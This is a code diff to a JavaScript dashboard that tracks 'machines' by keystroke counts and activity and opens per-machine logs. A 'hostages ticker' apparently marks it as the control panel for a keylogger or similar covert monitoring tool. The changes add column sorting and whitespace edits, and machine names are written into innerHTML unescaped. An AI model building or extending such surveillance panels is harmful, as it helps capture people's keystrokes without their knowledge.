@@ -25,7 +25,7 @@ document.addEventListener('DOMContentLoaded', function () {
         const button = document.getElementById('refreshButton');
         button.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Refreshing...';
         button.disabled = true;
-
+        
         updateDashboard().finally(() => {
             setTimeout(() => {
                 button.innerHTML = '<i class="fas fa-sync-alt me-2"></i>Refresh';
@@ -34,17 +34,86 @@ document.addEventListener('DOMContentLoaded', function () {
         });
     });
 
+    // Setup sorting functionality
+    setupTableSorting();
+
     // Load hostages ticker
     loadHostagesTicker();
 });
+
+// Global variables for sorting
+let currentSortColumn = 'name';
+let currentSortDirection = 'asc';
+
+function setupTableSorting() {
+    document.querySelectorAll('.sortable').forEach(headerCell => {
+        headerCell.addEventListener('click', function() {
+            const sortColumn = this.getAttribute('data-sort');
+            
+            // Toggle sort direction if clicking the same column
+            if (sortColumn === currentSortColumn) {
+                currentSortDirection = currentSortDirection === 'asc' ? 'desc' : 'asc';
+            } else {
+                currentSortColumn = sortColumn;
+                currentSortDirection = 'asc';
+            }
+            
+            // Update UI to show sort direction
+            document.querySelectorAll('.sortable').forEach(header => {
+                header.classList.remove('asc', 'desc');
+            });
+            this.classList.add(currentSortDirection);
+            
+            // Update displayed data
+            getMachinesDetails().then(machines => {
+                const sortedMachines = sortMachines(machines);
+                updateMachinesTable(sortedMachines);
+            });
+        });
+    });
+}
+
+// Function to sort machines based on current sort settings
+function sortMachines(machines) {
+    return [...machines].sort((a, b) => {
+        let valueA, valueB;
+        
+        switch(currentSortColumn) {
+            case 'name':
+                valueA = a.name.toLowerCase();
+                valueB = b.name.toLowerCase();
+                break;
+            case 'status':
+                valueA = a.is_active ? 1 : 0;
+                valueB = b.is_active ? 1 : 0;
+                break;
+            case 'lastActivity':
+                valueA = a.last_activity ? new Date(a.last_activity).getTime() : 0;
+                valueB = b.last_activity ? new Date(b.last_activity).getTime() : 0;
+                break;
+            case 'keystrokes':
+                valueA = a.total_keystrokes;
+                valueB = b.total_keystrokes;
+                break;
+            default:
+                return 0;
+        }
+        
+        const comparison = valueA > valueB ? 1 : valueA < valueB ? -1 : 0;
+        return currentSortDirection === 'asc' ? comparison : -comparison;
+    });
+}
 
 function updateDashboard() {
     return getMachinesDetails().then(machines => {
         // Update statistics
         updateStatistics(machines);
-
+        
+        // Sort machines before updating table
+        const sortedMachines = sortMachines(machines);
+        
         // Update machines table
-        updateMachinesTable(machines);
+        updateMachinesTable(sortedMachines);
     }).catch(error => {
         console.error('Error updating dashboard:', error);
     });
@@ -53,14 +122,14 @@ function updateDashboard() {
 function updateStatistics(machines) {
     let totalKeystrokes = 0;
     let activeMachines = 0;
-
+    
     machines.forEach(machine => {
         totalKeystrokes += machine.total_keystrokes;
         if (machine.is_active) {
             activeMachines++;
         }
     });
-
+    
     document.getElementById('machineCount').textContent = machines.length;
     document.getElementById('activeMachinesCount').textContent = activeMachines;
     document.getElementById('totalKeystrokes').textContent = totalKeystrokes.toLocaleString();
@@ -69,24 +138,24 @@ function updateStatistics(machines) {
 function updateMachinesTable(machines) {
     const machinesList = document.getElementById('machinesList');
     machinesList.innerHTML = '';
-
+    
     if (machines.length === 0) {
         const emptyRow = document.createElement('tr');
         emptyRow.innerHTML = '<td colspan="5" class="text-center py-4">No machines found</td>';
         machinesList.appendChild(emptyRow);
         return;
     }
-
+    
     machines.forEach(machine => {
         const row = document.createElement('tr');
-
-        const lastActivity = machine.last_activity ?
+        
+        const lastActivity = machine.last_activity ? 
             formatDateTime(machine.last_activity) : 'Never';
-
-        const status = machine.is_active ?
-            '<span class="status-badge bg-success">Active</span>' :
+        
+        const status = machine.is_active ? 
+            '<span class="status-badge bg-success">Active</span>' : 
             '<span class="status-badge bg-secondary">Inactive</span>';
-
+        
         row.innerHTML = `
             <td>${machine.name}</td>
             <td>${status}</td>
@@ -98,13 +167,13 @@ function updateMachinesTable(machines) {
                 </button>
             </td>
         `;
-
+        
         machinesList.appendChild(row);
     });
-
+    
     // Add event listeners to view logs buttons
     document.querySelectorAll('.view-logs-btn').forEach(button => {
-        button.addEventListener('click', function () {
+        button.addEventListener('click', function() {
             const machine = this.getAttribute('data-machine');
             window.open(`machine.html?machine=${machine}`, '_blank');
         });
@@ -132,7 +201,7 @@ function getMachinesDetails() {
 function formatDateTime(dateTimeStr) {
     const date = new Date(dateTimeStr);
     const today = new Date();
-
+    
     // Check if the date is today
     if (date.toDateString() === today.toDateString()) {
         return 'Today ' + date.toLocaleTimeString();
